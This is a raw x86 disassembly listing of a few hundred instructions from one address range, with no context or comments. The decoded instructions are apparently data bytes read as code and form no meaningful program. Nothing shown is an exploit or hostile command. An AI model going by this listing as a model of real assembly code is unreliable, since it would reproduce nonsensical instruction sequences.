  4172dd:	push   esp
  4172de:	ds pusha 
  4172e0:	ds push edi
  4172e2:	ds pusha 
  4172e4:	outs   dx,DWORD PTR ds:[esi]
  4172e5:	ds pusha 
  4172e7:	pop    edi
  4172e8:	push   esp
  4172e9:	jo     0x417342
  4172eb:	push   esp
  4172ec:	outs   dx,DWORD PTR ds:[esi]
  4172ed:	pop    edi
  4172ee:	push   esp
  4172ef:	push   esp
  4172f0:	push   ecx
  4172f1:	push   edi
  4172f2:	push   eax
  4172f3:	ds push ecx
  4172f5:	push   eax
  4172f6:	ds push eax
  4172f8:	pusha  
  4172f9:	ss xor al,0x3e
  4172fc:	xor    al,0x3b
  4172fe:	push   ecx
  4172ff:	sub    al,0x36
  417301:	cmp    edi,DWORD PTR [ebx]
  417303:	push   edi
  417304:	sub    DWORD PTR [esi],esi
  417306:	xor    al,0x2c
  417308:	sub    al,0x2c
  41730a:	sub    al,0x29
  41730c:	xor    al,0x2c
  41730e:	xor    al,0x3b
  417310:	xor    al,0x23
  417312:	sub    al,0x23
  417314:	cmp    edi,DWORD PTR [esi]
  417316:	ds xor al,0x29
  417319:	sub    al,0x2c
  41731b:	sub    DWORD PTR [eax],esp
  41731d:	and    BYTE PTR ss:[ebx],ah
  417320:	pop    ss
  417321:	pop    ss
  417322:	pop    ss
  417323:	adc    eax,0x17103620
  417328:	pop    ss
  417329:	sub    DWORD PTR [ebx],esp
  41732b:	and    ebp,DWORD PTR [ecx]
  41732d:	and    esp,DWORD PTR [ebx]
  41732f:	sub    DWORD PTR [ecx],ebp
  417331:	and    esi,DWORD PTR [ebx+edi*1]
  417334:	sub    DWORD PTR [ecx],ebp
  417336:	ds push edi
  417338:	sub    DWORD PTR [ebx+edi*1],ebp
  41733b:	and    ebp,DWORD PTR [esi+edi*1]
  41733e:	sub    al,0x20
  417340:	sub    al,0x29
  417342:	and    esi,DWORD PTR [esi]
  417344:	sub    DWORD PTR [ecx+ebp*1],esi
  417347:	sub    DWORD PTR [eax],esp
  417349:	ss sub al,0x36
  41734c:	ss cmp esi,DWORD PTR ss:[esp+ebp*1]
  417351:	ds push eax
  417353:	sub    al,0x2c
  417355:	cmp    edi,DWORD PTR [esi]
  417357:	bound  esp,QWORD PTR [edx+0x51]
  41735a:	cmp    esi,DWORD PTR [esi]
  41735c:	push   edi
  41735d:	bound  ebx,QWORD PTR [edi+0x64]
  417360:	cmp    esp,DWORD PTR [eax+0x36]
  417363:	pop    edi
  417364:	pusha  
  417365:	pusha  
  417366:	je     0x4173bc
  417368:	sub    al,0x50
  41736a:	pop    edi
  41736b:	pop    edi
  41736c:	push   eax
  41736d:	pop    edi
  41736e:	cmp    edi,DWORD PTR [ebx]
  417370:	push   edi
  417371:	push   esp
  417372:	push   edi
  417373:	push   ecx
  417374:	push   ecx
  417375:	pop    edi
  417376:	sub    al,0x3b
  417378:	push   edi
  417379:	ss ss push eax
  41737c:	sub    DWORD PTR [eax+edx*2],esi
  41737f:	push   eax
  417380:	pop    edi
  417381:	push   eax
  417382:	cmp    edx,DWORD PTR [edi+0x51]
  417385:	push   edi
  417386:	push   eax
  417387:	push   eax
  417388:	pop    ss
  417389:	xor    al,0x50
  41738b:	cmp    edx,DWORD PTR ds:0x50503e2c
  417391:	sub    DWORD PTR [esi+edi*1],ebp
  417394:	sub    DWORD PTR [ecx],ebp
  417396:	ds cmp esp,DWORD PTR ss:[ebx]
  41739a:	and    ebp,DWORD PTR [esi+esi*1]
  41739d:	sub    al,0x23
  41739f:	sub    DWORD PTR [edi],edx
  4173a1:	pop    ss
  4173a2:	and    edx,DWORD PTR [edi]
  4173a4:	sub    DWORD PTR [esi+esi*1],ebp
  4173a7:	xor    al,0x29
  4173a9:	sub    al,0x34
  4173ab:	xor    al,0x2c
  4173ad:	cmp    esp,DWORD PTR [ebx]
  4173af:	and    BYTE PTR [ecx],ch
  4173b1:	sub    al,0x23
  4173b3:	and    edx,DWORD PTR [edi]
  4173b5:	xor    al,0x15
  4173b7:	sub    al,0x2c
  4173b9:	push   eax
  4173ba:	pop    edi
  4173bb:	cmp    edx,DWORD PTR ss:[eax+0x36]
  4173bf:	cmp    esi,DWORD PTR [ecx+edx*2]
  4173c2:	cmp    esp,DWORD PTR [ebx]
  4173c4:	ss ss adc eax,0x36342320
  4173cb:	ds pusha 
  4173cd:	cmp    esi,DWORD PTR [esi]
  4173cf:	ss push eax
  4173d1:	cmp    esi,DWORD PTR [esi]
  4173d3:	cmp    edi,DWORD PTR [ebx]
  4173d5:	push   eax
  4173d6:	xor    al,0x54
  4173d8:	push   eax
  4173d9:	ds push ecx
  4173db:	push   esp
  4173dc:	push   eax
  4173dd:	pop    edi
  4173de:	pop    edi
  4173df:	pusha  
  4173e0:	push   edi
  4173e1:	ss push eax
  4173e3:	push   esp
  4173e4:	push   edi
  4173e5:	push   edi
  4173e6:	push   edi
  4173e7:	push   edi
  4173e8:	pusha  
  4173e9:	push   ecx
  4173ea:	push   esp
  4173eb:	cmp    edx,DWORD PTR [ecx+0x3e]
  4173ee:	push   eax
  4173ef:	push   edi
  4173f0:	push   ecx
  4173f1:	push   edi
  4173f2:	push   eax
  4173f3:	cmp    edx,DWORD PTR [eax+0x3e]
  4173f6:	cmp    edi,DWORD PTR [ebx]
  4173f8:	xor    al,0x51
  4173fa:	push   edi
  4173fb:	push   esp
  4173fc:	push   ecx
  4173fd:	push   ecx
  4173fe:	pop    edi
  4173ff:	ds push ecx
  417401:	push   eax
  417402:	ss ds push eax
  417405:	sub    DWORD PTR [esi],esi
  417407:	push   eax
  417408:	sub    DWORD PTR ss:[ebx],esp
  41740b:	sub    DWORD PTR [ecx],ebp
  41740d:	sub    DWORD PTR [esi],esi
  41740f:	and    esi,DWORD PTR [esi]
  417411:	and    BYTE PTR [eax],ah
  417413:	ss sub al,0x29
  417416:	and    BYTE PTR [esi+esi*1],ch
  417419:	xor    al,0x2c
  41741b:	and    ebp,DWORD PTR [ecx]
  41741d:	and    BYTE PTR [ebx],ah
  41741f:	and    edx,DWORD PTR ds:0x17171720
  417425:	and    BYTE PTR [eax],ah
  417427:	sub    DWORD PTR [esi],esi
  417429:	sub    al,0x2c
  41742b:	sub    DWORD PTR [esp+ebp*1],ebp
  41742e:	and    esi,DWORD PTR [esi]
  417430:	sub    al,0x36
  417432:	and    ebp,DWORD PTR ds:[esi+esi*1]
  417436:	cmp    esi,DWORD PTR [ebx+eiz*1]
  417439:	sub    DWORD PTR [ebx],edi
  41743b:	ss xor al,0x34
  41743e:	cmp    esi,DWORD PTR [esi+esi*1]
  417441:	and    esp,DWORD PTR [ebx]
  417443:	sub    DWORD PTR [esp+esi*1],ebp
  417446:	pop    ss
  417447:	xor    al,0x54
  417449:	push   ecx
  41744a:	cmp    edi,DWORD PTR ss:[esi]
  41744d:	xor    al,0x51
  41744f:	push   ecx
  417450:	ss sub al,0x29
  417453:	push   edi
  417454:	push   ecx
  417455:	push   ecx
  417456:	ss push eax
  417458:	push   esp
  417459:	push   esp
  41745a:	ds push esp
  41745c:	bound  esi,QWORD PTR [esi]
  41745e:	push   ecx
  41745f:	push   edi
  417460:	pop    edi
  417461:	xor    al,0x2c
  417463:	pop    edi
  417464:	push   esp
  417465:	cmp    edx,DWORD PTR [ebx+edi*1+0x3e]
  417469:	bound  ebp,QWORD PTR [edi+0x5f]
  41746c:	push   eax
  41746d:	pop    edi
  41746e:	push   eax
  41746f:	push   eax
  417470:	fs pusha 
  417472:	ss ds pusha 
  417475:	push   ecx
  417476:	ss xor al,0x36
  417479:	pop    edi
  41747a:	push   edi
  41747b:	push   eax
  41747c:	push   esp
  41747d:	push   ecx
  41747e:	cmp    esi,DWORD PTR ds:[esi]
  417481:	push   eax
  417482:	push   eax
  417483:	ss xor al,0x3e
  417486:	ss xor al,0x50
  417489:	push   eax
  41748a:	push   ecx
  41748b:	and    esi,DWORD PTR [esi]
  41748d:	cmp    edi,DWORD PTR [ebx]
  41748f:	ds sub al,0x34
  417492:	cmp    esi,DWORD PTR ss:[esi]
  417495:	cmp    ebp,DWORD PTR [ecx]
  417497:	sub    DWORD PTR [eax+eiz*1],esi
  41749a:	and    esp,DWORD PTR [ebx]
  41749c:	xor    al,0x34
  41749e:	sub    DWORD PTR [edi+edx*1],ebp
  4174a1:	and    BYTE PTR [edi],dl
  4174a3:	pop    ss
  4174a4:	and    esp,DWORD PTR [eax]
  4174a6:	pop    ss
  4174a7:	and    ebp,DWORD PTR [eax+eiz*1]
  4174aa:	and    BYTE PTR ds:0x362c3629,dl
  4174b0:	ds push eax
  4174b2:	cmp    edi,DWORD PTR [ebx]
  4174b4:	ss xor al,0x15
  4174b7:	sub    DWORD PTR [edi+edx*1],ebp
  4174ba:	ss push esp
  4174bc:	push   eax
  4174bd:	ds xor al,0x34
  4174c0:	and    ebp,DWORD PTR [ecx]
  4174c2:	and    esi,DWORD PTR ss:[esi]
  4174c5:	sub    DWORD PTR [eax],esp
  4174c7:	sub    al,0x29
  4174c9:	cmp    edi,DWORD PTR ds:[esi]
  4174cc:	push   esp
  4174cd:	cmp    edx,DWORD PTR [eax+0x36]
  4174d0:	and    edx,DWORD PTR [esi+edi*1+0x50]
  4174d4:	push   ecx
  4174d5:	pop    edi
  4174d6:	xor    al,0x54
  4174d8:	push   eax
  4174d9:	ss push eax
  4174db:	push   eax
  4174dc:	push   eax
  4174dd:	sub    DWORD PTR ds:[esi],edi
  4174e0:	push   eax
  4174e1:	xor    al,0x3b
  4174e3:	ds push eax
  4174e5:	push   eax
  4174e6:	push   eax
  4174e7:	sub    al,0x50
  4174e9:	pusha  
  4174ea:	pusha  
  4174eb:	fs pop edi
  4174ed:	cmp    edi,DWORD PTR [esi]
  4174ef:	and    edx,DWORD PTR [ecx+0x5f]
  4174f2:	xor    al,0x3e
  4174f4:	bound  edi,QWORD PTR ds:[esi]
  4174f7:	ss push eax
  4174f9:	pop    edi
  4174fa:	push   edi
  4174fb:	sub    DWORD PTR [esi],esi
  4174fd:	push   eax
  4174fe:	push   eax
  4174ff:	push   eax
  417500:	push   esp
  417501:	ds push eax
  417503:	ds xor al,0x50
  417506:	sub    al,0x36
  417508:	and    ebp,DWORD PTR [ebx+edi*1]
  41750b:	ss xor al,0x3b
  41750e:	xor    al,0x36
  417510:	ss ss ds xor al,0x29
  417515:	cmp    ebp,DWORD PTR [ecx]
  417517:	sub    al,0x23
  417519:	and    esp,DWORD PTR [eax]
  41751b:	xor    al,0x36
  41751d:	xor    al,0x2c
  41751f:	sub    al,0x15
  417521:	and    edx,DWORD PTR ds:0x362c1523
  417527:	adc    eax,0x17342034
  41752c:	and    BYTE PTR [eax],ah
  41752e:	adc    eax,0x2c2c2323
  417533:	push   ecx
  417534:	push   esp
  417535:	push   eax
  417536:	xor    al,0x34
  417538:	sub    DWORD PTR [ecx],ebp
  41753a:	sub    DWORD PTR [edi],ecx
  41753c:	xor    al,0x50
  41753e:	xor    al,0x54
  417540:	push   ecx
  417541:	sub    al,0x3e
  417543:	and    esi,DWORD PTR [esi+esi*1]
  417546:	sub    al,0x3b
  417548:	cmp    ebp,DWORD PTR [esp+esi*1]
  41754b:	push   edi
  41754c:	cmp    esi,DWORD PTR [esi]
  41754e:	ss xor al,0x3e
  417551:	xor    al,0x36
  417553:	pusha  
  417554:	push   edi
  417555:	push   esp
  417556:	sub    al,0x54
  417558:	push   edi
  417559:	pop    edi
  41755a:	push   ecx
  41755b:	push   eax
  41755c:	push   eax
  41755d:	push   esp
  41755e:	ds ss ds push eax
  417562:	cmp    edx,DWORD PTR [edi+ebx*2+0x2c]
  417566:	cmp    esi,DWORD PTR [ecx+edx*2]
  417569:	push   edi
  41756a:	push   eax
  41756b:	bound  edx,QWORD PTR [edx+eiz*2+0x60]
  41756f:	ss push ecx
  417571:	push   eax
  417572:	sub    al,0x51
  417574:	push   edi
  417575:	push   esp
  417576:	sub    DWORD PTR [esi],esi
  417578:	ds push ecx
  41757a:	push   esp
  41757b:	sub    DWORD PTR ss:[esi],esi
  41757e:	cmp    edi,DWORD PTR [esi]
  417580:	cmp    edi,DWORD PTR ds:[ebx]
  417583:	ss push eax
  417585:	cmp    esi,DWORD PTR ss:[esi]
  417588:	push   eax
  417589:	cmp    edx,DWORD PTR [eax+0x50]
  41758c:	xor    al,0x34
  41758e:	sub    al,0x20
  417590:	cmp    esi,DWORD PTR ss:[ebx+edi*1]
  417594:	xor    al,0x2c
  417596:	xor    al,0x20
  417598:	sub    al,0x34
  41759a:	xor    al,0x29
  41759c:	sub    al,0x29
  41759e:	sub    al,0x2c
  4175a0:	pop    ss
  4175a1:	adc    eax,0x20292020
  4175a6:	sub    al,0x23
  4175a8:	sub    DWORD PTR [ebx],esp
  4175aa:	and    edx,DWORD PTR ds:0x2320292c
  4175b0:	adc    BYTE PTR [edi],dl
  4175b2:	pop    ss
  4175b3:	sub    DWORD PTR [esi+esi*1],esi
  4175b6:	sub    DWORD PTR ss:[esi+edi*1],esi
  4175ba:	push   ecx
  4175bb:	push   ecx
  4175bc:	cmp    esp,DWORD PTR ss:[eax]
  4175bf:	pop    ss
  4175c0:	and    BYTE PTR [ebx],ah
  4175c2:	cmp    edx,DWORD PTR [eax+0x3e]
  4175c5:	ss ds push edi
  4175c8:	pop    edi
  4175c9:	push   ecx
  4175ca:	cmp    esi,DWORD PTR [esi]
  4175cc:	push   eax
  4175cd:	cmp    edx,DWORD PTR [eax+0x34]
  4175d0:	and    edi,DWORD PTR ss:[ebx]
  4175d3:	push   eax
  4175d4:	push   eax
  4175d5:	push   esp
  4175d6:	ds push edi
  4175d8:	ds push ecx
  4175da:	push   ecx
  4175db:	push   eax
  4175dc:	push   eax
  4175dd:	push   eax
  4175de:	push   ecx
  4175df:	push   edi
  4175e0:	push   eax
  4175e1:	sub    al,0x3b
  4175e3:	push   esp
  4175e4:	push   edi
  4175e5:	push   edi
  4175e6:	push   edi
  4175e7:	push   esp
  4175e8:	cmp    ebx,DWORD PTR [edi+0x5f]
  4175eb:	push   eax
  4175ec:	push   eax
  4175ed:	ds push ecx
  4175ef:	pusha  
  4175f0:	jo     0x417649
  4175f2:	ds push ecx
  4175f4:	sub    al,0x3e
  4175f6:	ss push edi
  4175f8:	ds ss ds ds push esp
  4175fd:	push   esp
  4175fe:	push   esp
  4175ff:	cmp    edx,DWORD PTR ss:[eax+0x2c]
  417603:	cmp    esp,DWORD PTR [ebx]
  417605:	sub    DWORD PTR [ecx+ebp*1],esi
  417608:	push   eax
  417609:	and    esi,DWORD PTR [esi+edi*1]
  41760c:	xor    al,0x36
  41760e:	xor    al,0x29
  417610:	cmp    ebp,DWORD PTR [ecx]
  417612:	sub    al,0x23
  417614:	sub    al,0x3b
  417616:	xor    al,0x29
  417618:	and    esi,DWORD PTR [esp+esi*1]
  41761b:	xor    al,0x2c
  41761d:	sub    DWORD PTR [ebx],esp
  41761f:	and    edx,DWORD PTR ds:0x15201520
  417625:	adc    eax,0x17202310
  41762a:	and    ebp,DWORD PTR [ecx]
  41762c:	sub    DWORD PTR [esi],esi
  41762e:	sub    DWORD PTR [eax],esp
  417630:	pop    ss
  417631:	and    ebp,DWORD PTR [ecx]
  417633:	and    BYTE PTR [eax+eiz*1],dh
  417636:	sub    al,0x2c
  417638:	and    BYTE PTR [ecx],ch
  41763a:	cmp    edi,DWORD PTR [esi]
  41763c:	cmp    esi,DWORD PTR [esi]
  41763e:	push   eax
  41763f:	push   edi
  417640:	sub    al,0x2c
  417642:	cmp    esi,DWORD PTR [esi]
  417644:	sub    DWORD PTR ds:[esp+esi*1],ebp
  417648:	push   eax
  417649:	ds push esp
  41764b:	push   ecx
  41764c:	push   ecx
  41764d:	ds xor al,0x3b
  417650:	push   eax
  417651:	cmp    ebp,DWORD PTR [edi+0x50]
  417654:	push   eax
  417655:	pop    edi
  417656:	cmp    edx,DWORD PTR [ecx+0x34]
  417659:	cmp    ebx,DWORD PTR [edi+0x36]
  41765c:	ds push ecx
  41765e:	push   ecx
  41765f:	push   eax
  417660:	push   esp
  417661:	xor    al,0x51
  417663:	push   ecx
  417664:	push   esp
  417665:	push   esp
  417666:	pop    edi
  417667:	pusha  
  417668:	push   eax
  417669:	pop    edi
  41766a:	cmp    edx,DWORD PTR [ecx+ebp*1+0x36]
  41766e:	ds xor al,0x51
  417671:	push   esp
  417672:	push   edi
  417673:	pusha  
  417674:	push   eax
  417675:	cmp    edx,DWORD PTR [ecx+0x3b]
  417678:	push   eax
  417679:	cmp    edx,DWORD PTR [eax+0x3e]
  41767c:	ss ds cmp edi,DWORD PTR ss:[esi]
  417681:	cmp    ebp,DWORD PTR [esi+edi*1]
  417684:	ds ds push ecx
  417687:	and    ebp,DWORD PTR [ecx+edx*2]
  41768a:	xor    al,0x2c
  41768c:	and    BYTE PTR [esi+esi*1],ch
  41768f:	sub    DWORD PTR [esp+esi*1],esi
  417692:	xor    al,0x29
  417694:	sub    DWORD PTR [esi],esi
  417696:	and    ebp,DWORD PTR ss:[ecx]
  417699:	sub    DWORD PTR [eax+eiz*1],ebp
  41769c:	xor    al,0x2c
  41769e:	and    BYTE PTR [edi],dl
  4176a0:	adc    eax,0x17232320
  4176a5:	adc    eax,0xf231020
  4176aa:	and    BYTE PTR [ecx],ch
  4176ac:	and    edx,DWORD PTR [edi]
  4176ae:	and    esp,DWORD PTR [ebx]
  4176b0:	sub    DWORD PTR [ecx+ebp*1],ebp
  4176b3:	xor    al,0x36
  4176b5:	and    BYTE PTR [esp+esi*1],dh
  4176b8:	sub    DWORD PTR [esi],esi
  4176ba:	cmp    ebp,DWORD PTR [esp+esi*1]
  4176bd:	push   eax
  4176be:	pop    ss
  4176bf:	cmp    edi,DWORD PTR [ebx]
  4176c1:	push   eax
  4176c2:	xor    al,0x3e
  4176c4:	ds push eax
  4176c6:	sub    al,0x2c
  4176c8:	push   eax
  4176c9:	and    esi,DWORD PTR [esi+esi*1]
  4176cc:	xor    al,0x54
  4176ce:	push   eax
  4176cf:	push   ecx
  4176d0:	push   eax
  4176d1:	ss ds ds ss push ecx
  4176d6:	cmp    edi,DWORD PTR [esi]
  4176d8:	push   ecx
  4176d9:	push   eax
  4176da:	and    BYTE PTR ds:[ebx],bh
  4176dd:	pop    edi
  4176de:	ds push eax
  4176e0:	push   eax
  4176e1:	push   eax
  4176e2:	cmp    edi,DWORD PTR [ebx]
  4176e4:	ss ss sub DWORD PTR ds:[edi+edx*2],esi
  4176ea:	ss push eax
  4176ec:	push   ecx
  4176ed:	pop    edi
  4176ee:	xor    al,0x3b
  4176f0:	cmp    esi,DWORD PTR ds:[esi]
  4176f3:	pop    edi
  4176f4:	pop    edi
  4176f5:	push   ecx
  4176f6:	ds ds push ecx
  4176f9:	xor    al,0x3b
  4176fb:	cmp    esp,DWORD PTR [ebx]
  4176fd:	sub    al,0x51
  4176ff:	push   eax
  417700:	and    edi,DWORD PTR [ebx]
  417702:	push   eax
  417703:	cmp    edi,DWORD PTR [ebx]
  417705:	cmp    ebp,DWORD PTR ds:[ebx+edi*1]
  417709:	sub    al,0x3b
  41770b:	ds ss xor al,0x2c
  41770f:	and    BYTE PTR ss:[ecx],ch
  417712:	sub    DWORD PTR [ebx],esp
  417714:	sub    DWORD PTR [eax],esp
  417716:	sub    DWORD PTR [ecx+ebp*1],ebp
  417719:	pop    ss
  41771a:	sub    DWORD PTR [edi],edx
  41771c:	and    esp,DWORD PTR [eax]
  41771e:	and    esp,DWORD PTR [eax]
  417720:	pop    ss
  417721:	adc    eax,0x23292923
  417726:	sub    al,0x17
  417728:	and    ebp,DWORD PTR [ecx]
  41772a:	adc    eax,0x2320362c
  41772f:	sub    DWORD PTR [eax],esp
  417731:	adc    BYTE PTR [ebx],ah
  417733:	and    esp,DWORD PTR [eax]
  417735:	and    esp,DWORD PTR [ebx]
  417737:	and    esp,DWORD PTR [ebx]
  417739:	sub    al,0x36
  41773b:	cmp    ebp,DWORD PTR [ecx]
  41773d:	push   eax
  41773e:	sub    DWORD PTR [ebx],edi
  417740:	xor    al,0x29
  417742:	sub    DWORD PTR [esp+ebp*1],ebp
  417745:	ds push ecx
  417747:	push   esp
  417748:	push   edi
  417749:	cmp    edi,DWORD PTR [ebx]
  41774b:	ds ss sub al,0x29
  41774f:	cmp    esi,DWORD PTR [esi]
  417751:	push   ecx
  417752:	push   eax
  417753:	ss push esp
  417755:	push   esp
  417756:	cmp    esi,DWORD PTR [ebx+edi*1]
  417759:	ss ds xor al,0x34
  41775d:	pop    edi
  41775e:	push   ecx
  41775f:	cmp    edi,DWORD PTR [ebx]
  417761:	cmp    edi,DWORD PTR [esi]
  417763:	ds ss push eax
  417766:	cmp    ebp,DWORD PTR [ecx+ebp*1]
  417769:	push   ecx
  41776a:	push   ecx
  41776b:	pop    edi
  41776c:	ds push eax
  41776e:	ss ds push esp
  417771:	cmp    edx,DWORD PTR ds:[edi+0x3b]
  417775:	push   edi
  417776:	push   ecx
  417777:	pusha  
  417778:	xor    al,0x3b
  41777a:	cmp    edi,DWORD PTR [esi]
  41777c:	sub    al,0x54
  41777e:	push   ecx
  41777f:	cmp    ebp,DWORD PTR [ebx+edi*1]
  417782:	sub    DWORD PTR [ecx],ebp
  417784:	cmp    edi,DWORD PTR [esi]
  417786:	sub    al,0x3b
  417788:	cmp    esp,DWORD PTR [ebx]
  41778a:	ds ds cmp ebp,DWORD PTR ds:[ecx]
  41778f:	xor    al,0x34
  417791:	xor    al,0x23
  417793:	xor    al,0x2c
  417795:	sub    DWORD PTR [ecx+ebp*1],ebp
  417798:	sub    al,0x23
  41779a:	and    edi,DWORD PTR [esi]
  41779c:	and    BYTE PTR [eax],ah
  41779e:	pop    ss
  41779f:	and    BYTE PTR ds:0x20202017,dl
  4177a5:	and    BYTE PTR [esi],dh
  4177a7:	sub    DWORD PTR [eax],esp
  4177a9:	and    BYTE PTR [eax],ah
  4177ab:	xor    al,0x2c
  4177ad:	ss push eax
  4177af:	and    esi,DWORD PTR [esi]
  4177b1:	sub    al,0x29
  4177b3:	sub    DWORD PTR [ecx],ebp
  4177b5:	sub    DWORD PTR [ecx],ebp
  4177b7:	and    ebp,DWORD PTR [ecx]
  4177b9:	sub    DWORD PTR [esp+ebp*1],ebp
  4177bc:	and    edx,DWORD PTR [edi+0x2c]
  4177bf:	xor    al,0x36
  4177c1:	push   eax
  4177c2:	sub    DWORD PTR [eax+edx*2],esi
  4177c5:	sub    DWORD PTR [esp+esi*1],esi
  4177c8:	push   ecx
  4177c9:	push   eax
  4177ca:	push   eax
  4177cb:	push   edi
  4177cc:	pop    edi
  4177cd:	push   edi
  4177ce:	push   ecx
  4177cf:	push   eax
  4177d0:	sub    DWORD PTR [esi+esi*1],ebp
  4177d3:	sub    DWORD PTR [ebx],edi
  4177d5:	push   esp
  4177d6:	push   ecx
  4177d7:	push   esp
  4177d8:	cmp    edi,DWORD PTR [ebx]
  4177da:	push   eax
  4177db:	and    esi,DWORD PTR [edi+ebx*2]
  4177de:	push   eax
  4177df:	push   eax
  4177e0:	ds sub al,0x3b
  4177e3:	push   ecx
  4177e4:	push   ecx
  4177e5:	ds push esp
  4177e7:	push   esp
  4177e8:	push   ecx
  4177e9:	sub    DWORD PTR [eax+0x60],edx
  4177ec:	cmp    edx,DWORD PTR [eax+0x34]
  4177ef:	ss pop edi
  4177f1:	push   edi
  4177f2:	ds push esp
  4177f4:	cmp    edx,DWORD PTR ds:[esp+eiz*2+0x51]
  4177f9:	xor    al,0x36
  4177fb:	sub    DWORD PTR [eax+0x51],edx
  4177fe:	ss xor al,0x3e
  417801:	sub    al,0x3b
  417803:	xor    al,0x3e
  417805:	cmp    ebp,DWORD PTR [esi+esi*1]
  417808:	sub    al,0x3b
  41780a:	push   eax
  41780b:	and    edi,DWORD PTR ss:[ebx]
  41780e:	sub    al,0x29
  417810:	cmp    ebp,DWORD PTR [esp+ebp*1]
  417813:	and    esi,DWORD PTR [esi]
  417815:	xor    al,0x34
  417817:	xor    al,0x2c
  417819:	sub    DWORD PTR [ecx+ebp*1],ebp
  41781c:	pop    ss
  41781d:	sub    DWORD PTR [eax],esp
  41781f:	and    BYTE PTR ds:0x17202320,dl
  417825:	and    esp,DWORD PTR [ebx]
  417827:	sub    DWORD PTR [eax],esp
  417829:	sub    DWORD PTR [edi],edx
  41782b:	and    esp,DWORD PTR [eax]
  41782d:	pop    ss
  41782e:	pop    ss
  41782f:	and    esp,DWORD PTR [eax]
  417831:	push   eax
  417832:	sub    al,0x3b
  417834:	push   eax
  417835:	push   eax
  417836:	ds cmp esi,DWORD PTR ds:[esi]
  41783a:	xor    al,0x29
  41783c:	and    edx,DWORD PTR [edi]
  41783e:	sub    al,0x29
  417840:	and    esi,DWORD PTR [esi]
  417842:	cmp    ebp,DWORD PTR ds:[ecx]
  417845:	ds push ecx
  417847:	push   ecx
  417848:	cmp    esi,DWORD PTR [ecx+ebp*1]
  41784b:	ds push eax
  41784d:	push   ecx
  41784e:	xor    al,0x5f
  417850:	push   edi
  417851:	push   eax
  417852:	push   edi
  417853:	push   eax
  417854:	ss ss ss cmp edx,DWORD PTR ds:[esp+ebp*1+0x3e]
  41785c:	sub    al,0x3b
  41785e:	sub    al,0x36
  417860:	push   eax
  417861:	sub    DWORD PTR ds:[esi],esi
  417864:	push   ecx
  417865:	ds push ecx
  417867:	ds push ecx
  417869:	cmp    esp,DWORD PTR [edx+0x3e]
  41786c:	cmp    edx,DWORD PTR ds:[ecx+0x34]
  417870:	push   ecx
  417871:	xor    al,0x2c
  417873:	push   esp
  417874:	xor    al,0x34
  417876:	push   eax
  417877:	cmp    edx,DWORD PTR [ecx+0x50]
  41787a:	push   esp
  41787b:	ss pop edi
  41787d:	cmp    edi,DWORD PTR ss:[ebx]
  417880:	ds push esp
  417882:	ss sub al,0x51
  417885:	and    esi,DWORD PTR [esi]
  417887:	sub    al,0x34
  417889:	sub    DWORD PTR [ebx],edi
  41788b:	and    ebp,DWORD PTR [ecx]
  41788d:	xor    al,0x29
  41788f:	sub    DWORD PTR [esi],esi
  417891:	xor    al,0x2c
  417893:	xor    al,0x29
  417895:	sub    DWORD PTR [ecx+ebp*1],esi
  417898:	and    BYTE PTR [ebx],ah
  41789a:	sub    al,0x29
  41789c:	sub    DWORD PTR [ecx],ebp
  41789e:	sub    DWORD PTR [ebx+eiz*1],esi
  4178a1:	sub    DWORD PTR [ebx],esp
  4178a3:	and    BYTE PTR [ecx],ch
  4178a5:	and    esp,DWORD PTR [eax]
  4178a7:	pop    ss
  4178a8:	pop    ss
  4178a9:	sub    al,0x10
  4178ab:	and    ebp,DWORD PTR [ecx]
  4178ad:	and    BYTE PTR [ecx],ch
  4178af:	pop    ss
  4178b0:	pop    ss
  4178b1:	and    esp,DWORD PTR [eax]
  4178b3:	sub    al,0xf
  4178b5:	and    esp,DWORD PTR [ebx]
  4178b7:	sub    DWORD PTR [esi],esi
  4178b9:	ss push ecx
  4178bb:	push   eax
  4178bc:	push   ecx
  4178bd:	push   ecx
  4178be:	push   ecx
  4178bf:	pop    edi
  4178c0:	cmp    esi,DWORD PTR [ecx+edx*2]
  4178c3:	push   eax
  4178c4:	sub    DWORD PTR ds:0x3e502c34,edx
  4178ca:	cmp    edx,DWORD PTR ss:[eax+0x36]
  4178ce:	ss push eax
  4178d0:	ss ds push esp
  4178d3:	push   ecx
  4178d4:	push   esp
  4178d5:	push   esp
  4178d6:	cmp    edx,DWORD PTR ss:[eax+0x34]
  4178da:	sub    DWORD PTR [ebx],esp
  4178dc:	xor    al,0x51
  4178de:	ds xor al,0x2c
  4178e1:	pop    ss
  4178e2:	push   edi
  4178e3:	push   eax
  4178e4:	push   ecx
  4178e5:	push   edi
  4178e6:	ds push eax
  4178e8:	cmp    edx,DWORD PTR [ecx+0x51]
  4178eb:	push   esp
  4178ec:	push   ecx
  4178ed:	push   eax
  4178ee:	pop    edi
  4178ef:	push   ecx
  4178f0:	push   edi
  4178f1:	push   edi
  4178f2:	pop    edi
  4178f3:	pop    edi
  4178f4:	cmp    edx,DWORD PTR [ecx+0x3e]
  4178f7:	cmp    esi,DWORD PTR [esi+edi*1]
  4178fa:	ds pusha 
  4178fc:	push   ecx
  4178fd:	xor    al,0x3b
  4178ff:	push   esp
  417900:	push   eax
  417901:	cmp    edi,DWORD PTR [ebx]
  417903:	ds ds push ecx
  417906:	sub    DWORD PTR ds:[esi+esi*1],esi
  41790a:	xor    al,0x23
  41790c:	and    BYTE PTR [esp+ebp*1],dh
  41790f:	xor    al,0x34
  417911:	ss sub al,0x29
  417914:	xor    al,0x2c
  417916:	and    BYTE PTR ss:[ecx],ch
  417919:	sub    al,0x23
  41791b:	and    BYTE PTR [ebx],ah
  41791d:	xor    al,0x15
  41791f:	sub    DWORD PTR ds:0x23171717,edx
  417925:	sub    DWORD PTR [ebx],esp
  417927:	sub    DWORD PTR [ebx],esp
  417929:	sub    DWORD PTR [ecx],ebp
  41792b:	and    BYTE PTR [ebx],ah
  41792d:	and    ecx,DWORD PTR ss:[edi]
  417930:	adc    BYTE PTR [esp+esi*1],ch
  417933:	sub    al,0x2c
  417935:	and    ebp,DWORD PTR [esi+esi*1]
  417938:	cmp    esi,DWORD PTR [esi]
  41793a:	push   ecx
  41793b:	cmp    edi,DWORD PTR [ebx]
  41793d:	ss xor al,0x29
  417940:	cmp    edx,DWORD PTR [ecx+0x3e]
  417943:	push   eax
  417944:	push   ecx
  417945:	push   ecx
  417946:	cmp    edi,DWORD PTR [ebx]
  417948:	push   eax
  417949:	push   eax
  41794a:	sub    DWORD PTR [ebx+edi*1],esi
  41794d:	xor    al,0x50
  41794f:	ds xor al,0x54
  417952:	cmp    ebp,DWORD PTR [esp+ebp*1]
  417955:	ss push ecx
  417957:	push   edi
  417958:	bound  edx,QWORD PTR [edi+0x5f]
